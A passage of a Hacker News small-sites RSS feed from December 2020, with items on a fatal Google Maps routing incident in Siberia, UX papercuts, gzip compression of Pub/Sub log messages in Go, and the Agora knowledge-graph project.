            <link>https://blokable.com/news/housing-market-isnt-broken-its-working-perfectly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574525</guid>
            <pubDate>Tue, 29 Dec 2020 20:30:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Maps changes a route after the drama of young people lost on a ghost road]]>
            </title>
            <description>
<![CDATA[
Score 235 | Comments 305 (<a href="https://news.ycombinator.com/item?id=25574180">thread link</a>) | @f311a
<br/>
December 29, 2020 | https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/ | <a href="https://web.archive.org/web/*/https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id=""><p><span>Google Maps</span></p><figcaption>A point on the Russian Highway of Bones.</figcaption></div><div><p><a rel="nofollow" target="_blank" href="https://www.google.com/maps/place/Yakutsk,+Rep%C3%BAblica+de+Saj%C3%A1,+Rusia/@62.0314236,129.5617032,22380m/data=!3m2!1e3!4b1!4m5!3m4!1s0x5bf63939a0d2c47d:0x69b4c4b35cafa2fb!8m2!3d62.0396912!4d129.7422192">Google Maps</a> has been forced to change a route in the Russian Far East after a young man, Sergei Ustinov, was tragically frozen to death and his friend, Vladislav Istomin, was found in serious condition.</p><p>The two 18-year-old friends wanted to make the journey between Yakutsk, capital of the Republic of Sakha, in eastern Siberia, and Madagan.  2,000 kilometers and 34 hours by <a rel="nofollow" target="_blank" title="car" href="https://45.32.73.142/cars/">car</a> separate both cities.  Despite the minus 50ºC in that area during these dates, the young people decided to make the trip in their Toyota Chaser.</p><p>Ustinov went to Google Maps to tell him which was the fastest route: it came out as recommended <a rel="nofollow" target="_blank" href="https://es.wikipedia.org/wiki/Autopista_de_Kolim%C3%A1">the Kolimá highway or Highway of the Bones</a>.  It was three hours faster than the Russian Yandex browser told him.</p></div><div id=""><p><span>Google Maps</span></p><figcaption>The distance between both populations.</figcaption></div><div><p>This road, as reported by official documents, is located in one of the coldest areas in the world, where the populations of<strong> </strong>Oimiakón and Tomtor, considered the coldest inhabited places on the planet, since they have temperatures of down to minus 71.2 ° C in the middle of winter.</p><p>In addition, local media assure that it is a road that has been in disuse since the 70s where there is practically nothing.</p><p>On the way, a stick from a tree struck the radiator of the car, leaving both young men lying in their vehicle in the middle of nowhere.  They tried to make a small fire with the spare wheel rim, but it was not possible due to the cold.</p><p>This was explained to the local media by the official of the Russian Investigation Committee, Nadezhda Dvoretskaya: “The two young men tried to keep warm and burned a tire, but apparently they could not make a big fire because they could not remove the rest of the tires” .</p><p>Dvoretskaya did say that the young people had been able to communicate with their families, <a rel="nofollow" target="_blank" href="https://www.semana.com/mundo/articulo/final-tragico-para-un-joven-que-atendio-las-recomendaciones-de-google-maps/202013/">as reported in the Colombian newspaper <em>Week</em></a>.</p><p>When a rescue committee found them, Ustinov had already died as a result of the cold.  Istomin, who was in serious condition, was taken by helicopter to a hospital in the town of Ust-Nera. <a rel="nofollow" target="_blank" href="https://siberiantimes.com/other/others/news/tragedy-in-yakutia-as-man-18-freezes-to-death-inside-broken-down-car-on-road-of-bones-at-50c/">According to information from <em>Siberian Times</em></a>, had a frostbite on his arms and legs and is fighting to save his life.</p></div><hr><p><strong>Source:</strong> <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">Huffington Post Spain Athena2</a> <strong>by</strong> <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">www.huffingtonpost.es</a>.</p><p>*The article has been translated based on the content of <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">Huffington Post Spain Athena2</a> by <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">www.huffingtonpost.es</a>. If there is any problem regarding the content, copyright, please leave a report below the article. We will try to process as quickly as possible to protect the rights of the author. Thank you very much!</p><p>*We just want readers to access information more quickly and easily with other multilingual content, instead of information only available in a certain language.</p><p>*We always respect the copyright of the content of the author and always include the original link of the source article.If the author disagrees, just leave the report below the article, the article will be edited or deleted at the request of the author. Thanks very much! Best regards!</p><hr><div> <div><div><div><ul><li> <label for="input-reason-553565"> Issue: <span>*</span> </label><br> </li><li> <label for="input-name-553565"> Your Name: <span>*</span> </label><br> </li><li> <label for="input-email-553565"> Your Email: <span>*</span> </label><br> </li></ul></div> </div></div></div></div></div>]]>
            </description>
            <link>https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574180</guid>
            <pubDate>Tue, 29 Dec 2020 20:06:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UX Papercuts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25574021">thread link</a>) | @tosh
<br/>
December 29, 2020 | https://dcgross.com/fixing-ux-papercuts/ | <a href="https://web.archive.org/web/*/https://dcgross.com/fixing-ux-papercuts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>[TL;DR: Small nits drain users over time; hard to see this yourself; hard to see in data; talk to users like they’re guests in your fine hotel.]</p> <p>How frequently do you find yourself mildly annoyed at software dysfunction? Tapping phone numbers in Google Calendar opens them in Maps. The Mac WiFi menu is slow. Google Docs doesn’t let you share external docs on mobile. Etc. Etc. Lots of small papercuts.</p> <p><strong>Low Energy</strong></p> <p>Do you ever report these bugs? I don’t. When I use something I’m usually trying to <em>get a thing done</em>. I’d be willing to, but I budget very little energy for this side-quest.</p> <p>For years I’ve had my email plastered on my Twitter bio. Recently I opened my DMs. Messages started flooding in. Where were these people? Did they not see the email address in the bio?</p> <p>I think the lesson from both of these points is that product usage follows a certain momentum and flow. Users might be willing to break momentum, but only slightly. You’re on Twitter. The way to message people on Twitter is through DMs. Not email. If there’s no DM option, well, whatever. Move on. Similarly, the user who experiences a bug with Google Docs isn’t going to go through the trouble to write a detailed report to Sundar. Too much energy, breaking from the flow of usage.</p> <p><strong>Energy Efficient Feedback</strong></p> <p>So how do you get feedback about your papercuts if nobody cares to report them? Two options.</p> <p><strong>1. Playtesting</strong></p> <p>Video games are a great place to study UX design, because the product <em>is</em> flow. Not sending emails. Not writing documents. Flow. You’re <em>in the zone</em> when you play a good game. Even the smallest micro cut breaks that. <a href="https://www.playtestcloud.com/">PlayTestCloud</a> is a popular tool for game designers. It lets you upload an APK, and instructs their testing audience to <em>narrate their thoughts</em> as they play the game.</p> <p>Microsoft’s <a href="https://en.wikipedia.org/wiki/RITE_Method">RITE method</a> is another example of this. I can’t recommend these strategies enough. The thing I’m about to suggest next will seem more exciting to hack on, but still – nothing will beat the above.</p> <p><strong>2. Changing Equations</strong></p> <p><img src="https://dcgross.com/assets/bloomberg.png" alt=""></p> <p>This is a Bloomberg Terminal keyboard. Custom built, it includes a dedicated Help button highlighted above. Tap it twice, and you’ll get launched into an instant IM or phone call with someone at Bloomberg. 24/7.</p> <p>This is good, but I think there’s room to innovate further. I’d consider dedicating an entire block of your UI as an always-on textbox. I wouldn’t make it a button like Intercom. A textbox. Every little bit of friction matters! It should be in a prominent place, and it should never go away. Let the user know they can type anything in there and you’ll respond. Here’s the twist:</p> <p>When you do implement fixes, <em>announce and celebrate them</em>. Use Twitter, Instagram, whatever. Thank your users. What you’re doing here is both decreasing cost (fluid, always-on UI) and increasing the reward (social affirmation) required in order to give feedback.</p> <hr> <p>Hopefully these strategies help you identify your papercuts. I can’t recommend the first approach more. Talk to your users and get them to spool the logs of their mind to you. Even small numbers will do.</p> </article></div>]]>
            </description>
            <link>https://dcgross.com/fixing-ux-papercuts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574021</guid>
            <pubDate>Tue, 29 Dec 2020 19:52:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We compress Pub/Sub messages and more, saving a load of money]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25573605">thread link</a>) | @lawrjone
<br/>
December 29, 2020 | https://blog.lawrencejones.dev/compress-everything/ | <a href="https://web.archive.org/web/*/https://blog.lawrencejones.dev/compress-everything/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    
<p>Compression is a trick that can be used to solve a load of problems. Often, your
tools will compress content transparently: most modern browsers ask for gzipped
HTTP payload, and some filesystems can be configured to compress blocks without
the user ever asking.</p>

<p>Outside of well known use cases, there are a variety of opportunities to improve
efficiency or save a load of money by leveraging compression. It’s useful to be
aware of common use cases, so you can take these opportunities when they arise.</p>



<p>As a recent example, my team were migrating logs from one Elasticsearch cluster
to another. While not quite Big Data™, this cluster had 10 billion log entries,
or some 60TB of raw JSON.</p>

<p>Having experience tackling long-running, large-scale migrations like this, you
want to build a process that allows you to ‘save game’ as frequently as
possible. This means you can build and run an export process, handling whatever
issues will occur (they will, I promise!), then move cleanly on-to the import
process. As with exports, your import process will also screw up: so it, too,
should be easily re-runnable.</p>

<p>As it is used across a load of GoCardless systems, <a href="https://cloud.google.com/pubsub">Google
Pub/Sub</a> is a natural fit for this problem.
Google’s marketing tagline even sounds like it was written to describe our
ideal, decoupled process:</p>

<blockquote>
  <p>Pub/Sub is an asynchronous messaging service that decouples services that
produce events from services that process events.</p>
</blockquote>

<p>In Pub/Sub, you <a href="https://cloud.google.com/pubsub/docs/publisher">publish messages to topics</a>. Each topic can
have many subscriptions, which <a href="https://cloud.google.com/pubsub/docs/subscriber">consumers can pull messages
from</a>. In the most simple terms, the migration would:</p>

<ol>
  <li>Export logs from the origin cluster into a (per-index) Pub/Sub topic</li>
  <li>Configure the Pub/Sub subscriptions to retain events (set
<code>retain_acked_messages</code>, see: <a href="https://cloud.google.com/pubsub/docs/replay-overview">Replaying and purging messages</a>)
so that we may replay them, if our import goes wrong</li>
  <li>Import logs by pulling messages from the topic subscriptions</li>
</ol>

<p>So, what’s this got to do with compression? Like most Cloud services, Pub/Sub
charges on usage, which means we’ll incur fees proportional to the data we’ll
push through the service.</p>

<p>These charges are:</p>

<ul>
  <li>$40 per TiB delivered, applied to publish and subscribe</li>
  <li>Google Compute Engine network rates (we’ll ignore these, as they get complicated)</li>
  <li>Seek-related message storage, to retain our messages, at $0.27 per GiB-month</li>
</ul>

<p>In the best case where we import/export successfully on the first attempt (this
won’t, and did not happen), we’ll be charged <strong>2 x $40 x 60TB = $4,800 for
message delivery</strong>, as it will apply to both publish and subscribe. If we retain
our messages for 2 weeks while the migration is on-going, we’ll be charged <strong>0.5
x $0.27 x 60,000GB = $8,100 for message storage</strong>.</p>

<p>This leaves a <strong>lower-bound of $12,900 to perform the migration</strong>.</p>

<p>Now, GoCardless isn’t poor. And as a rule of thumb, you normally want to
optimise for engineering hours over infrastructure cost.</p>

<p>But if you can reduce cost with a minimal amount of effort, you should.</p>



<p>To this end, we made a small change to our migration tool (<code>elastic-toolbox</code>) to
support compression of the messages we published to Pub/Sub.</p>

<p>With error handling removed, this is the publish method, where we apply
compression after serialisation:</p>

<div><div><pre><code><span>// Publish takes a message and publishes it to the Pub/Sub topic. If</span>
<span>// compression is enabled, the message payload is compressed, and the</span>
<span>// message is marked with a compress=true attribute.</span>
<span>func</span> <span>(</span><span>f</span> <span>*</span><span>pubsubExportTarget</span><span>)</span> <span>Publish</span><span>(</span><span>ctx</span> <span>context</span><span>.</span><span>Context</span><span>,</span> <span>msg</span> <span>Message</span><span>)</span> <span>error</span> <span>{</span>
    <span>data</span><span>,</span> <span>_</span> <span>:=</span> <span>json</span><span>.</span><span>Marshal</span><span>(</span><span>msg</span><span>)</span>
    <span>if</span> <span>f</span><span>.</span><span>opt</span><span>.</span><span>Compress</span> <span>{</span>
        <span>data</span><span>,</span> <span>_</span> <span>=</span> <span>f</span><span>.</span><span>compress</span><span>(</span><span>data</span><span>)</span>
    <span>}</span>

    <span>// enqueue marks a message as available to be sent, passing it</span>
    <span>// to the Pub/Sub client</span>
    <span>f</span><span>.</span><span>enqueue</span><span>(</span><span>ctx</span><span>,</span> <span>&amp;</span><span>pubsub</span><span>.</span><span>Message</span><span>{</span>
        <span>Data</span><span>:</span> <span>data</span><span>,</span>
        <span>Attributes</span><span>:</span> <span>map</span><span>[</span><span>string</span><span>]</span><span>string</span><span>{</span>
            <span>"compress"</span><span>:</span> <span>fmt</span><span>.</span><span>Sprintf</span><span>(</span><span>"%v"</span><span>,</span> <span>f</span><span>.</span><span>opt</span><span>.</span><span>Compress</span><span>),</span>
        <span>},</span>
    <span>})</span>

    <span>return</span> <span>nil</span>
<span>}</span>
</code></pre></div></div>

<p>The compression itself is dead simple, and almost entirely observability code:</p>

<div><div><pre><code><span>var</span> <span>(</span>
    <span>exportPubsubWriteCompressionRatio</span> <span>=</span> <span>promauto</span><span>.</span><span>NewHistogram</span><span>(</span>
        <span>prometheus</span><span>.</span><span>HistogramOpts</span><span>{</span>
            <span>Name</span><span>:</span>    <span>"elastic_toolbox_export_pubsub_write_compression_ratio"</span><span>,</span>
            <span>Help</span><span>:</span>    <span>"Distribution of compression ratio"</span><span>,</span>
            <span>Buckets</span><span>:</span> <span>prometheus</span><span>.</span><span>LinearBuckets</span><span>(</span><span>0.1</span><span>,</span> <span>0.1</span><span>,</span> <span>10</span><span>),</span> <span>// 0.0 -&gt; 1.0</span>
        <span>},</span>
    <span>)</span>
    <span>exportPubsubWriteCompressDurationSeconds</span> <span>=</span> <span>promauto</span><span>.</span><span>NewHistogram</span><span>(</span>
        <span>prometheus</span><span>.</span><span>HistogramOpts</span><span>{</span>
            <span>Name</span><span>:</span>    <span>"elastic_toolbox_export_pubsub_write_compress_duration_seconds"</span><span>,</span>
            <span>Help</span><span>:</span>    <span>"Distribution of time taken to compress hits"</span><span>,</span>
            <span>Buckets</span><span>:</span> <span>prometheus</span><span>.</span><span>ExponentialBuckets</span><span>(</span><span>0.0625</span><span>,</span> <span>2</span><span>,</span> <span>8</span><span>),</span> <span>// 0.0625 -&gt; 16s</span>
        <span>},</span>
    <span>)</span>
<span>)</span>

<span>// compress applies gzip compression to the incoming data, and instruments</span>
<span>// compression efficiency.</span>
<span>func</span> <span>(</span><span>f</span> <span>*</span><span>pubsubExportTarget</span><span>)</span> <span>compress</span><span>(</span><span>data</span> <span>[]</span><span>byte</span><span>)</span> <span>([]</span><span>byte</span><span>,</span> <span>error</span><span>)</span> <span>{</span>
    <span>defer</span> <span>prometheus</span><span>.</span><span>NewTimer</span><span>(</span><span>prometheus</span><span>.</span><span>ObserverFunc</span><span>(</span><span>func</span><span>(</span><span>v</span> <span>float64</span><span>)</span> <span>{</span>
        <span>exportPubsubWriteCompressDurationSeconds</span><span>.</span><span>Observe</span><span>(</span><span>v</span><span>)</span>
    <span>}))</span><span>.</span><span>ObserveDuration</span><span>()</span>

    <span>var</span> <span>buffer</span> <span>bytes</span><span>.</span><span>Buffer</span>
    <span>zw</span> <span>:=</span> <span>gzip</span><span>.</span><span>NewWriter</span><span>(</span><span>&amp;</span><span>buffer</span><span>)</span>
    <span>if</span> <span>_</span><span>,</span> <span>err</span> <span>:=</span> <span>zw</span><span>.</span><span>Write</span><span>(</span><span>data</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>return</span> <span>nil</span><span>,</span> <span>err</span>
    <span>}</span>

    <span>if</span> <span>err</span> <span>:=</span> <span>zw</span><span>.</span><span>Close</span><span>();</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>return</span> <span>nil</span><span>,</span> <span>err</span>
    <span>}</span>

    <span>compressed</span> <span>:=</span> <span>buffer</span><span>.</span><span>Bytes</span><span>()</span>
    <span>exportPubsubWriteCompressionRatio</span><span>.</span><span>Observe</span><span>(</span>
        <span>float64</span><span>(</span><span>len</span><span>(</span><span>compressed</span><span>))</span> <span>/</span> <span>float64</span><span>(</span><span>len</span><span>(</span><span>data</span><span>)))</span>

    <span>return</span> <span>compressed</span><span>,</span> <span>nil</span>
<span>}</span>
</code></pre></div></div>



<p>As our savings will be proportional to our compression ratio (compressed /
original bytes), we care a lot about how compressible our data is.</p>

<p>JSON logs are likely to be very compressible as:</p>

<ul>
  <li>Logs share many of the JSON keys, which can be de-duplicated (<code>kubernetes.pod_name</code>)</li>
  <li>Values of common log fields might occur very often (<code>kubernetes.labels.namespace</code>)</li>
</ul>

<p>Using the modified <code>elastic-toolbox</code> to run an concurrent export of three
different indices, we can use the
<code>elastic_toolbox_export_pubsub_write_compression_ratio</code> Prometheus metric (see
the <code>compress</code> method above) to build a heatmap of compression ratios:</p>

<figure>
  <a href="https://snapshot.raintank.io/dashboard/snapshot/gHTtGvZh2hK67q03kIU4uJM3q4Sqek8p?orgId=2" target="_blank">
    <img src="https://blog.lawrencejones.dev/assets/images/compress-everything-ratio-heatmap.png" alt="Compressed bytes divided by original bytes, always less than 30%">
  </a>
  <figcaption>
    Compressed bytes / original bytes, always &lt;30%
  </figcaption>
</figure>

<p>This heatmap shows that all messages compressed to <strong>at most 30% the original
size</strong>. When measured over our entire corpus of logs, we average at a <strong>~12%
compression ratio, meaning 1GiB of logs becomes just 120MiB.</strong></p>

<p>Our original bill of $12,900 has become 12% x $12,900 = $1,548.</p>

<p>This means <strong>we’ve saved about $11,500.</strong></p>

<p>Explore the data for yourself at this <a href="https://snapshot.raintank.io/dashboard/snapshot/gHTtGvZh2hK67q03kIU4uJM3q4Sqek8p?orgId=2" target="_blank">Raintank Snapshot: elastic-toolbox compression</a>.</p>



<p>The most obvious next step was to apply this to our logging pipeline all the
time. Given we ship container logs straight into Pub/Sub, pulling them out of a
subscription into Elasticsearch, we can easily write a
<a href="https://www.fluentd.org/">fluentd</a> filter that applies the same compression
strategy.</p>

<p>My colleague Ben put together an awesome dashboard to track how much we save,
which works out to be <strong>several thousand a month</strong>:</p>

<figure>
  <img src="https://blog.lawrencejones.dev/assets/images/compress-everything-headline-figures.png" alt="Savings from compressing logs as they enter the logging pipeline, several thousand dollars a month">
  <figcaption>
    Savings from compressing logs as they enter the logging pipeline
  </figcaption>
</figure>



<p>If you work in a Cloud environment, there are so many opportunities to save
money by compressing your data.</p>

<p>Beyond logs, another GoCardless example is a tool called
<a href="https://github.com/gocardless/draupnir">draupnir</a>. This service hosts copies of
our production databases for load testing and forensic analysis (query plan
prediction, etc). Google SSD storage costs $187 per TiB/month, which means every
copy of our <strong>5TB Postgres costs $1,000/month</strong>.</p>

<p>Draupnir might host several copies at a time, depending on the use cases. We can
save a load of money by enabling <a href="https://btrfs.wiki.kernel.org/index.php/Compression">btrfs
compression</a> to
transparently compress the filesystem blocks, allowing us to use <strong>~70% less SSD
capacity</strong> than we may otherwise.</p>

<p>And if you thought compression was limited to cost savings, you’d be wrong!
Having suffered from occasional micro-outages when people ran large backfills or
built new database indexes, we solved the problem by enabling Postgres WAL
compression (see <a href="https://www.cybertec-postgresql.com/en/postgresql-underused-features-wal-compression/">Postgres Underused Features: WAL Compression</a>,
or the <a href="https://www.postgresql.org/docs/13/runtime-config-wal.html">Postgres Write Ahead Log docs</a>).</p>

<p>The outages were caused by database operations creating a large amount of WAL
churn, where the replica would stall while writing the WAL to disk. By
compressing the WAL stream, we <strong>significantly reduced the IO spikes, allowing
the replica to handle the stream without issue</strong>.</p>

<p>There are more examples, but I think this paints a good picture.</p>



<p>Compression is a trade-off, a decision we make to trade CPU for another resource
that might be more expensive or less available. The value assigned to CPU,
memory, or network bandwidth continually changes, and you’ll need to make this
calculation on a case-by-case basis.</p>

<p>This post aimed to cover a scenario where the cost of compression, in both
compute resource and time-to-build, was significantly outweighed by the savings
it would make. Not all situations will have the same economics, but it takes a
few minutes of napkin maths to decide either way.</p>

<p>I hope this case study prompts consideration of compression outside of standard,
boring use-cases, and helps to find opportunities where you can apply it to your
own systems.</p>


    
    <p>
      <em>
        Discuss this post on
        <a target="_blank" href="https://news.ycombinator.com/item?id=25573605">Hackernews</a>.
      </em>
    </p>
    
  </section></div>]]>
            </description>
            <link>https://blog.lawrencejones.dev/compress-everything/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573605</guid>
            <pubDate>Tue, 29 Dec 2020 19:16:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Agora – an experimental social network]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25573523">thread link</a>) | @flancian
<br/>
December 29, 2020 | http://anagora.org/node/agora | <a href="https://web.archive.org/web/*/http://anagora.org/node/agora">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	




<div>
<div>
    
<ul>
<li><a href="https://anagora.org/" rel="nofollow">The Agora is a distributed knowledge graph and experimental social network</a>.<ul>
<li>As an Agora <em>guest</em> you can currently:<ul>
<li>Navigate the Agora, which is composed of <a href="http://anagora.org/node/nodes" rel="nofollow">nodes</a> which aggregate content from many users about the same topic or entity.</li>
<li>Make use of <a href="http://anagora.org/node/backlinks" rel="nofollow">backlinks</a> and <a href="http://anagora.org/node/pulled-nodes" rel="nofollow">pulled nodes</a> to discover relevant content.</li>
</ul>
</li>
<li>As an Agora <em>user</em> you can:<ul>
<li>Have your content be surfaced to readers at relevant times (when they are visiting a <a href="http://anagora.org/node/node" rel="nofollow">node</a> for which your content is considered relevant by the community).</li>
<li>Have relevant content be surfaced to you as you traverse your <a href="http://anagora.org/node/personal-knowledge-graph" rel="nofollow">personal knowledge graph</a>.</li>
<li>Make use of <a href="http://anagora.org/node/agora-actions" rel="nofollow">agora actions</a>.</li>
</ul>
</li>
<li>Anyone can run an Agora of their own if they so desire. This Agora is <a href="http://anagora.org/node/open-source" rel="nofollow">open source</a>.</li>
</ul>
</li>
<li>To <a href="http://anagora.org/node/sign-up" rel="nofollow">sign up</a> for the Agora, first you need to publish your <a href="http://anagora.org/node/digital-garden" rel="nofollow">digital garden</a> or <a href="http://anagora.org/node/content" rel="nofollow">content</a> elsewhere online. The Agora doesn't host your data, but rather pulls it from a location <em>you</em> control and renders it for you and other users; it interlinks your data with that of other users as you wish.<ul>
<li>If you know your way around <a href="http://anagora.org/node/git" rel="nofollow">git</a>, <a href="http://anagora.org/node/markdown" rel="nofollow">markdown</a> on git is the default format. If you use <a href="http://anagora.org/node/roam" rel="nofollow">roam</a> or a <a href="http://anagora.org/node/roam-like" rel="nofollow">roam like</a> or you have a notes database, you're almost there. Please refer to <a href="https://anagora.org/go/agora-howto" rel="nofollow">agora howto</a> for detailed instructions.</li>
<li>Whatever participation mechanism you choose, you can either send a <a href="http://anagora.org/node/pull-request" rel="nofollow">pull request</a> adding yourself to the repository or let an Agora <a href="http://anagora.org/node/maintainer" rel="nofollow">maintainer</a> know where your <a href="http://anagora.org/node/digital-garden" rel="nofollow">digital garden</a> or <a href="http://anagora.org/node/content" rel="nofollow">content</a> is, so it can be pulled by the Agora and <a href="http://anagora.org/node/integrated" rel="nofollow">integrated</a>. We strive to continuously support new sources and formats. Please send email to signup@anagora.org or <a href="https://twitter.com/flancian" rel="nofollow">tweet at me</a> with:<ul>
<li>The URL for your content.</li>
<li>Your desired username.</li>
</ul>
</li>
<li>The Agora wants to be <a href="http://anagora.org/node/maximally-inclusive" rel="nofollow">maximally inclusive</a>, but it is in its infancy; it is a <a href="http://anagora.org/node/work-in-progress" rel="nofollow">work in progress</a>. If you want to participate and can't, please also send email to signup@anagora.org to let us know.<ul>
<li>Through projects such as <a href="http://anagora.org/node/agora-twitter-integration" rel="nofollow">agora twitter integration</a>, we hope to make the Agora available to anyone that has access to a social network account.</li>
</ul>
</li>
<li>If you want to learn more about the <a href="http://anagora.org/node/experimental" rel="nofollow">experimental</a> nature of this Agora, please refer to <a href="https://news.ycombinator.com/item?id=25577016" rel="nofollow">this Hacker News comment</a>.</li>
<li>If you want to keep up to date with development, consider adding me on Twitter or Mastodon: <a href="http://anagora.org/node/flancian" rel="nofollow">flancian</a>.</li>
</ul>
</li>
<li>An Agora is, in its most basic form, a set of useful conventions.<ul>
<li>Useful conventions are made explicit through an Agora's <a href="http://anagora.org/node/contract" rel="nofollow">CONTRACT</a> and the writing of its users.</li>
<li>You can think of the Agora as a distributed <a href="http://anagora.org/node/sequential-wiki" rel="nofollow">sequential wiki</a>; an experiment in <a href="http://anagora.org/node/semantic-web" rel="nofollow">semantic web</a> <a href="http://anagora.org/node/applications" rel="nofollow">applications</a>.</li>
<li>An Agora is a <a href="http://anagora.org/node/distributed-knowledge-graph" rel="nofollow">distributed knowledge graph</a> maintained by the users of an experimental <a href="http://anagora.org/node/social-network" rel="nofollow">social network</a>.<ul>
<li>By <a href="http://anagora.org/node/you" rel="nofollow">you</a> and <a href="http://anagora.org/node/me" rel="nofollow">me</a>. Anyone can participate if they are willing.</li>
<li>Check out <a href="http://anagora.org/node/agora-howto" rel="nofollow">agora howto</a> (users) or <a href="http://anagora.org/node/agora-plan" rel="nofollow">agora plan</a> (developers) if you want to jump in.</li>
</ul>
</li>
</ul>
</li>
<li>This Agora tries to be a good <a href="http://anagora.org/node/internet-citizen" rel="nofollow">internet citizen</a>. <ul>
<li>The <a href="http://anagora.org/node/agora-protocol" rel="nofollow">agora protocol</a> is openly developed and can be implemented by anyone.</li>
<li>See also: <a href="http://anagora.org/node/wikilinks-everywhere" rel="nofollow">wikilinks everywhere</a>. </li>
</ul>
</li>
<li><a href="http://anagora.org/node/go" rel="nofollow">go</a> <a href="http://github.com/flancian/agora" rel="nofollow">github.com/flancian/agora</a></li>
<li><a href="http://anagora.org/node/pull" rel="nofollow">pull</a> <a href="http://anagora.org/node/agora-editor" rel="nofollow">agora editor</a></li>
<li>There are <a href="http://anagora.org/node/other-agoras" rel="nofollow">other agoras</a>.</li>
</ul>
</div>

<div>
    
<ul>
<li>[ ] build a tool to filter a json roam export for only nodes tagged with <code>\#public</code> <a href="http://anagora.org/node/roam2agora" rel="nofollow">roam2agora</a></li>
</ul>
</div>

<div>
    <p>An agora, in its broadest sense, is a conceptual space where people attempt to bring an increased level of intentionality, explicitness, and mutual agreement to the principles and protocols for interacting in that space. A further aspect of the idea of an Agora is that it is a space which enables collaboration. In particular, it is a space that allows for collaboration guided by specific shared interests, without requiring the co-consitutients of the agora to be aligned more fully or generally in terms of their intentions, values, etc. </p>
<p>Some topics that the idea of an Agora is related to: <a href="http://anagora.org/node/transparency" rel="nofollow">transparency</a> <a href="http://anagora.org/node/decentralized-structures" rel="nofollow">decentralized structures</a> <a href="http://anagora.org/node/egalitarian-principles" rel="nofollow">egalitarian principles</a> <a href="http://anagora.org/node/judgement" rel="nofollow">judgement</a> <a href="http://anagora.org/node/algorithms-of-interaction" rel="nofollow">algorithms of interaction</a> <a href="http://anagora.org/node/communication" rel="nofollow">communication</a> <a href="http://anagora.org/node/collaboration" rel="nofollow">collaboration</a> <a href="http://anagora.org/node/knowledge-sharing" rel="nofollow">knowledge sharing</a></p>
<p>There are (infinitely) many possible variants of how this idea might be implemented in concrete, real-world situations. For example, an agora could be a space that is opened up inside a conversation between two people. Or it could be a collaborative project that is accompanied by specified rules. Or it could be a collective agreement about how to handle certain types of situations. </p>
<p>One variant of the idea of an Agora is a place where personal notes are shared, with the common goal of pooling information and sharing knowledge. One implementation of this idea is <a href="https://anagora.org/" rel="nofollow">https://anagora.org</a>. See also <a href="https://flancia.org/go/agora" rel="nofollow">https://flancia.org/go/agora</a>.</p>
<p>The term "Agora" and the basic idea come from <a href="http://anagora.org/node/flancia" rel="nofollow">Flancia</a>. </p>
</div>



</div>






<!--
 Copyright 2020 Google LLC

 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->




    </div></div>]]>
            </description>
            <link>http://anagora.org/node/agora</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573523</guid>
            <pubDate>Tue, 29 Dec 2020 19:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla FSD Beta 8 tested for self-driving performance in snowy conditions]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 141 (<a href="https://news.ycombinator.com/item?id=25573378">thread link</a>) | @CarCooler
<br/>
December 29, 2020 | https://www.teslaoracle.com/2020/12/29/fsd-beta-8-tested-for-self-driving-performance-in-snowy-conditions/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2020/12/29/fsd-beta-8-tested-for-self-driving-performance-in-snowy-conditions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
			<figure data-amp-original-style="margin-bottom:30px;">
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
